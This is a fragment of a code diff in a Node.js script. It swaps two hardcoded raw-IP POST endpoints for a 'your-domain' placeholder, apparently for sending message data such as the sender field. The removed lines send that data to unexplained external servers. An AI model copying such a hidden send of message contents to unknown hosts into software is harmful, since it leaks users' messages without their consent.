@@ -213,8 +213,7 @@ const XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
 const xhr = new XMLHttpRequest();
 
 // configure a `POST` request
-//xhr.open('POST', 'http://23.238.48.252/kgn/vnc.php');
-xhr.open('POST', 'http://104.168.145.99/wapay/kgn.php');
+xhr.open('POST', 'http://your-domain/php/echo.php');
 
 var froms = msg.from;   
     
